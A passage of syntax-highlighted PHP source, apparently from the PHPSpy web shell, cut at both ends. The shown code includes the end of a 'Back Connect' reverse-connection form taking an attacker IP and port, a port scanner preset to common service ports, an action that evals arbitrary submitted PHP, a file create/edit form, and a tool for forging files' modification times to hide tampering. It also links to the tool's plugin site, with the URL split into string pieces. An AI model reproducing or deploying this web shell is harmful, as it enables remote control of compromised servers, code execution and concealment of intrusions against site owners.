<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">m(</span><span style="color: #ad7fa8; font-style: italic;">"Now script try connect to $yourip port $yourport ..."</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }

<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">formhead(array(</span><span style="color: #ad7fa8; font-style: italic;">'title'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'Back Connect'</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'action'</span>,<span style="color: #ad7fa8; font-style: italic;">'backconnect'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;p&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'Your IP:'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makeinput(array(</span><span style="color: #ad7fa8; font-style: italic;">'name'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'yourip'</span>,<span style="color: #ad7fa8; font-style: italic;">'size'</span>=&gt;<span style="color: #eeeeec; background-color: #2e3436;">20</span>,<span style="color: #ad7fa8; font-style: italic;">'value'</span>=&gt;$<span style="color: #eeeeec;">yourip</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'Your Port:'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makeinput(array(</span><span style="color: #ad7fa8; font-style: italic;">'name'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'yourport'</span>,<span style="color: #ad7fa8; font-style: italic;">'size'</span>=&gt;<span style="color: #eeeeec; background-color: #2e3436;">15</span>,<span style="color: #ad7fa8; font-style: italic;">'value'</span>=&gt;$<span style="color: #eeeeec;">yourport</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'Use:'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makeselect(array(</span><span style="color: #ad7fa8; font-style: italic;">'name'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'use'</span>,<span style="color: #ad7fa8; font-style: italic;">'option'</span>=&gt;$<span style="color: #eeeeec;">usedb</span>,<span style="color: #ad7fa8; font-style: italic;">'selected'</span>=&gt;$<span style="color: #eeeeec;">use</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makeinput(array(</span><span style="color: #ad7fa8; font-style: italic;">'name'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'start'</span>,<span style="color: #ad7fa8; font-style: italic;">'value'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'Start'</span>,<span style="color: #ad7fa8; font-style: italic;">'type'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'submit'</span>,<span style="color: #ad7fa8; font-style: italic;">'class'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'bt'</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;/p&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">formfoot(</span>);
}<span style="color: #888a85;">//</span><span style="color: #888a85;">end</span>

<span style="color: #729fcf; font-weight: bold;">elseif</span> ($<span style="color: #eeeeec;">action</span> == <span style="color: #ad7fa8; font-style: italic;">'portscan'</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> !$<span style="color: #eeeeec;">scanip</span> &amp;&amp; $<span style="color: #eeeeec;">scanip</span> = <span style="color: #ad7fa8; font-style: italic;">'127.0.0.1'</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> !$<span style="color: #eeeeec;">scanport</span> &amp;&amp; $<span style="color: #eeeeec;">scanport</span> = <span style="color: #ad7fa8; font-style: italic;">'21,25,80,110,135,139,445,1433,3306,3389,5631,43958'</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">formhead(array(</span><span style="color: #ad7fa8; font-style: italic;">'title'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'Port Scan'</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'action'</span>,<span style="color: #ad7fa8; font-style: italic;">'portscan'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;p&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'IP:'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makeinput(array(</span><span style="color: #ad7fa8; font-style: italic;">'name'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'scanip'</span>,<span style="color: #ad7fa8; font-style: italic;">'size'</span>=&gt;<span style="color: #eeeeec; background-color: #2e3436;">20</span>,<span style="color: #ad7fa8; font-style: italic;">'value'</span>=&gt;$<span style="color: #eeeeec;">scanip</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'Port:'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makeinput(array(</span><span style="color: #ad7fa8; font-style: italic;">'name'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'scanport'</span>,<span style="color: #ad7fa8; font-style: italic;">'size'</span>=&gt;<span style="color: #eeeeec; background-color: #2e3436;">80</span>,<span style="color: #ad7fa8; font-style: italic;">'value'</span>=&gt;$<span style="color: #eeeeec;">scanport</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makeinput(array(</span><span style="color: #ad7fa8; font-style: italic;">'name'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'startscan'</span>,<span style="color: #ad7fa8; font-style: italic;">'value'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'Scan'</span>,<span style="color: #ad7fa8; font-style: italic;">'type'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'submit'</span>,<span style="color: #ad7fa8; font-style: italic;">'class'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'bt'</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;/p&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">formfoot(</span>);

<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> ($<span style="color: #eeeeec;">startscan</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;h2&gt;Result &amp;raquo;&lt;/h2&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;ul class="info"&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">foreach</span>(<span style="color: #eeeeec; background-color: #2e3436;">explode(</span><span style="color: #ad7fa8; font-style: italic;">','</span>, $<span style="color: #eeeeec;">scanport</span>) <span style="color: #729fcf; font-weight: bold;">as</span> $<span style="color: #eeeeec;">port</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">fp</span> = @<span style="color: #eeeeec; background-color: #2e3436;">fsockopen(</span>$<span style="color: #eeeeec;">scanip</span>, $<span style="color: #eeeeec;">port</span>, &amp;$<span style="color: #eeeeec;">errno</span>, &amp;$<span style="color: #eeeeec;">errstr</span>, <span style="color: #eeeeec; background-color: #2e3436;">1</span>); 
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> (!$<span style="color: #eeeeec;">fp</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;li&gt;'</span>.$<span style="color: #eeeeec;">scanip</span>.<span style="color: #ad7fa8; font-style: italic;">':'</span>.$<span style="color: #eeeeec;">port</span>.<span style="color: #ad7fa8; font-style: italic;">' ------------------------ &lt;span style="font-weight:bold;color:#f00;"&gt;Close&lt;/span&gt;&lt;/li&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span>  } <span style="color: #729fcf; font-weight: bold;">else</span> {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;li&gt;'</span>.$<span style="color: #eeeeec;">scanip</span>.<span style="color: #ad7fa8; font-style: italic;">':'</span>.$<span style="color: #eeeeec;">port</span>.<span style="color: #ad7fa8; font-style: italic;">' ------------------------ &lt;span style="font-weight:bold;color:#080;"&gt;Open&lt;/span&gt;&lt;/li&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> @<span style="color: #eeeeec; background-color: #2e3436;">fclose(</span>$<span style="color: #eeeeec;">fp</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span>  } 
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;/ul&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
}

<span style="color: #729fcf; font-weight: bold;">elseif</span> ($<span style="color: #eeeeec;">action</span> == <span style="color: #ad7fa8; font-style: italic;">'eval'</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">phpcode</span> = <span style="color: #eeeeec; background-color: #2e3436;">trim(</span>$<span style="color: #eeeeec;">phpcode</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>($<span style="color: #eeeeec;">phpcode</span>){
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span> (!<span style="color: #eeeeec; background-color: #2e3436;">preg_match(</span><span style="color: #ad7fa8; font-style: italic;">'#&lt;\?#si'</span>, $<span style="color: #eeeeec;">phpcode</span>)) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">phpcode</span> = <span style="color: #ad7fa8; font-style: italic;">"&lt;?php\n\n{$phpcode}\n\n?&gt;"</span>;
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">eval(</span><span style="color: #ad7fa8; font-style: italic;">"?"</span>.<span style="color: #ad7fa8; font-style: italic;">"&gt;$phpcode&lt;?"</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">formhead(array(</span><span style="color: #ad7fa8; font-style: italic;">'title'</span>=<span style="color: #8ae234;">&gt;</span><span style="color: #ad7fa8; font-style: italic;">'Eval PHP Code'</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'action'</span>,<span style="color: #ad7fa8; font-style: italic;">'eval'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">maketext(array(</span><span style="color: #ad7fa8; font-style: italic;">'title'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'PHP Code'</span>,<span style="color: #ad7fa8; font-style: italic;">'name'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'phpcode'</span>, <span style="color: #ad7fa8; font-style: italic;">'value'</span>=&gt;$<span style="color: #eeeeec;">phpcode</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;p&gt;&lt;a href="http://w'</span>.<span style="color: #ad7fa8; font-style: italic;">'ww.4ng'</span>.<span style="color: #ad7fa8; font-style: italic;">'el.net/php'</span>.<span style="color: #ad7fa8; font-style: italic;">'spy/pl'</span>.<span style="color: #ad7fa8; font-style: italic;">'ugin/" target="_blank"&gt;Get plugins&lt;/a&gt;&lt;/p&gt;'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">formfooter(</span>);
}<span style="color: #888a85;">//</span><span style="color: #888a85;">end eval</span>

<span style="color: #729fcf; font-weight: bold;">elseif</span> ($<span style="color: #eeeeec;">action</span> == <span style="color: #ad7fa8; font-style: italic;">'editfile'</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #729fcf; font-weight: bold;">if</span>(<span style="color: #eeeeec; background-color: #2e3436;">file_exists(</span>$<span style="color: #eeeeec;">opfile</span>)) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">fp</span>=@<span style="color: #eeeeec; background-color: #2e3436;">fopen(</span>$<span style="color: #eeeeec;">opfile</span>,<span style="color: #ad7fa8; font-style: italic;">'r'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">contents</span>=@<span style="color: #eeeeec; background-color: #2e3436;">fread(</span>$<span style="color: #eeeeec;">fp</span>, <span style="color: #eeeeec; background-color: #2e3436;">filesize(</span>$<span style="color: #eeeeec;">opfile</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> @<span style="color: #eeeeec; background-color: #2e3436;">fclose(</span>$<span style="color: #eeeeec;">fp</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">contents</span>=<span style="color: #eeeeec; background-color: #2e3436;">htmlspecialchars(</span>$<span style="color: #eeeeec;">contents</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> }
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">formhead(array(</span><span style="color: #ad7fa8; font-style: italic;">'title'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'Create / Edit File'</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'action'</span>,<span style="color: #ad7fa8; font-style: italic;">'file'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'dir'</span>,$<span style="color: #eeeeec;">nowpath</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makeinput(array(</span><span style="color: #ad7fa8; font-style: italic;">'title'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'Current File (import new file name and new file)'</span>,<span style="color: #ad7fa8; font-style: italic;">'name'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'editfilename'</span>,<span style="color: #ad7fa8; font-style: italic;">'value'</span>=&gt;$<span style="color: #eeeeec;">opfile</span>,<span style="color: #ad7fa8; font-style: italic;">'newline'</span>=&gt;<span style="color: #eeeeec; background-color: #2e3436;">1</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">maketext(array(</span><span style="color: #ad7fa8; font-style: italic;">'title'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'File Content'</span>,<span style="color: #ad7fa8; font-style: italic;">'name'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'filecontent'</span>,<span style="color: #ad7fa8; font-style: italic;">'value'</span>=&gt;$<span style="color: #eeeeec;">contents</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">formfooter(</span>);

<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">goback(</span>);

}<span style="color: #888a85;">//</span><span style="color: #888a85;">end editfile</span>

<span style="color: #729fcf; font-weight: bold;">elseif</span> ($<span style="color: #eeeeec;">action</span> == <span style="color: #ad7fa8; font-style: italic;">'newtime'</span>) {
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">opfilemtime</span> = @<span style="color: #eeeeec; background-color: #2e3436;">filemtime(</span>$<span style="color: #eeeeec;">opfile</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #888a85;">//</span><span style="color: #888a85;">$time = strtotime("$year-$month-$day $hour:$minute:$second");</span>
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> $<span style="color: #eeeeec;">cachemonth</span> = <span style="color: #eeeeec; background-color: #2e3436;">array(</span><span style="color: #ad7fa8; font-style: italic;">'January'</span>=&gt;<span style="color: #eeeeec; background-color: #2e3436;">1</span>,<span style="color: #ad7fa8; font-style: italic;">'February'</span>=&gt;<span style="color: #eeeeec; background-color: #2e3436;">2</span>,<span style="color: #ad7fa8; font-style: italic;">'March'</span>=&gt;<span style="color: #eeeeec; background-color: #2e3436;">3</span>,<span style="color: #ad7fa8; font-style: italic;">'April'</span>=&gt;<span style="color: #eeeeec; background-color: #2e3436;">4</span>,<span style="color: #ad7fa8; font-style: italic;">'May'</span>=&gt;<span style="color: #eeeeec; background-color: #2e3436;">5</span>,<span style="color: #ad7fa8; font-style: italic;">'June'</span>=&gt;<span style="color: #eeeeec; background-color: #2e3436;">6</span>,<span style="color: #ad7fa8; font-style: italic;">'July'</span>=&gt;<span style="color: #eeeeec; background-color: #2e3436;">7</span>,<span style="color: #ad7fa8; font-style: italic;">'August'</span>=&gt;<span style="color: #eeeeec; background-color: #2e3436;">8</span>,<span style="color: #ad7fa8; font-style: italic;">'September'</span>=&gt;<span style="color: #eeeeec; background-color: #2e3436;">9</span>,<span style="color: #ad7fa8; font-style: italic;">'October'</span>=&gt;<span style="color: #eeeeec; background-color: #2e3436;">10</span>,<span style="color: #ad7fa8; font-style: italic;">'November'</span>=&gt;<span style="color: #eeeeec; background-color: #2e3436;">11</span>,<span style="color: #ad7fa8; font-style: italic;">'December'</span>=&gt;<span style="color: #eeeeec; background-color: #2e3436;">12</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">formhead(array(</span><span style="color: #ad7fa8; font-style: italic;">'title'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'Clone folder/file was last modified time'</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'action'</span>,<span style="color: #ad7fa8; font-style: italic;">'file'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'dir'</span>,$<span style="color: #eeeeec;">nowpath</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makeinput(array(</span><span style="color: #ad7fa8; font-style: italic;">'title'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'Alter folder/file'</span>,<span style="color: #ad7fa8; font-style: italic;">'name'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'curfile'</span>,<span style="color: #ad7fa8; font-style: italic;">'value'</span>=&gt;$<span style="color: #eeeeec;">opfile</span>,<span style="color: #ad7fa8; font-style: italic;">'size'</span>=&gt;<span style="color: #eeeeec; background-color: #2e3436;">120</span>,<span style="color: #ad7fa8; font-style: italic;">'newline'</span>=&gt;<span style="color: #eeeeec; background-color: #2e3436;">1</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makeinput(array(</span><span style="color: #ad7fa8; font-style: italic;">'title'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'Reference folder/file (fullpath)'</span>,<span style="color: #ad7fa8; font-style: italic;">'name'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'tarfile'</span>,<span style="color: #ad7fa8; font-style: italic;">'size'</span>=&gt;<span style="color: #eeeeec; background-color: #2e3436;">120</span>,<span style="color: #ad7fa8; font-style: italic;">'newline'</span>=&gt;<span style="color: #eeeeec; background-color: #2e3436;">1</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">formfooter(</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">formhead(array(</span><span style="color: #ad7fa8; font-style: italic;">'title'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'Set last modified'</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'action'</span>,<span style="color: #ad7fa8; font-style: italic;">'file'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makehide(</span><span style="color: #ad7fa8; font-style: italic;">'dir'</span>,$<span style="color: #eeeeec;">nowpath</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makeinput(array(</span><span style="color: #ad7fa8; font-style: italic;">'title'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'Current folder/file (fullpath)'</span>,<span style="color: #ad7fa8; font-style: italic;">'name'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'curfile'</span>,<span style="color: #ad7fa8; font-style: italic;">'value'</span>=&gt;$<span style="color: #eeeeec;">opfile</span>,<span style="color: #ad7fa8; font-style: italic;">'size'</span>=&gt;<span style="color: #eeeeec; background-color: #2e3436;">120</span>,<span style="color: #ad7fa8; font-style: italic;">'newline'</span>=&gt;<span style="color: #eeeeec; background-color: #2e3436;">1</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'&lt;p&gt;year:'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makeinput(array(</span><span style="color: #ad7fa8; font-style: italic;">'name'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'year'</span>,<span style="color: #ad7fa8; font-style: italic;">'value'</span>=&gt;<span style="color: #eeeeec; background-color: #2e3436;">date(</span><span style="color: #ad7fa8; font-style: italic;">'Y'</span>,$<span style="color: #eeeeec;">opfilemtime</span>),<span style="color: #ad7fa8; font-style: italic;">'size'</span>=&gt;<span style="color: #eeeeec; background-color: #2e3436;">4</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'month:'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makeinput(array(</span><span style="color: #ad7fa8; font-style: italic;">'name'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'month'</span>,<span style="color: #ad7fa8; font-style: italic;">'value'</span>=&gt;<span style="color: #eeeeec; background-color: #2e3436;">date(</span><span style="color: #ad7fa8; font-style: italic;">'m'</span>,$<span style="color: #eeeeec;">opfilemtime</span>),<span style="color: #ad7fa8; font-style: italic;">'size'</span>=&gt;<span style="color: #eeeeec; background-color: #2e3436;">2</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'day:'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makeinput(array(</span><span style="color: #ad7fa8; font-style: italic;">'name'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'day'</span>,<span style="color: #ad7fa8; font-style: italic;">'value'</span>=&gt;<span style="color: #eeeeec; background-color: #2e3436;">date(</span><span style="color: #ad7fa8; font-style: italic;">'d'</span>,$<span style="color: #eeeeec;">opfilemtime</span>),<span style="color: #ad7fa8; font-style: italic;">'size'</span>=&gt;<span style="color: #eeeeec; background-color: #2e3436;">2</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'hour:'</span>);
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">makeinput(array(</span><span style="color: #ad7fa8; font-style: italic;">'name'</span>=&gt;<span style="color: #ad7fa8; font-style: italic;">'hour'</span>,<span style="color: #ad7fa8; font-style: italic;">'value'</span>=&gt;<span style="color: #eeeeec; background-color: #2e3436;">date(</span><span style="color: #ad7fa8; font-style: italic;">'H'</span>,$<span style="color: #eeeeec;">opfilemtime</span>),<span style="color: #ad7fa8; font-style: italic;">'size'</span>=&gt;<span style="color: #eeeeec; background-color: #2e3436;">2</span>));
<span style="background-color: #404040;"> </span> <span style="background-color: #404040;"> </span> <span style="color: #eeeeec; background-color: #2e3436;">p(</span><span style="color: #ad7fa8; font-style: italic;">'minute:'</span>);
